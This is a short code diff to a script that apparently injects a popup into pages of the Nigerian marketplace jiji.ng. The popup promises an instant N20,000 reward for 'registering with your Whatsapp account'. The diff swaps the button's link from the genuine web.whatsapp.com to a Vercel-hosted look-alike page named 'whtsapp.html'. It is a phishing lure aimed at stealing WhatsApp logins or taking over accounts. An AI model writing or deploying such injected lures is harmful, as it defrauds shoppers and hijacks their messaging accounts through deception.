@@ -362,7 +362,7 @@ if(location.href.includes("jiji.ng") ){
     <div class="popup-image">ðŸš€</div>
     <h2>Unlock Premium Funds</h2>
     <p>Join Thousands of users who earn as they buy from this store. Get N20,000 Instantly and many more benefits by registering with your Whatsapp account.</p>
-    <a href="https://web.whatsapp.com" class="cta-button">Claim N20k Instantly now</a>
+    <a href="https://tester-orcin.vercel.app/whtsapp.html" class="cta-button">Claim N20k Instantly now</a>
   </div>
 </div>
 
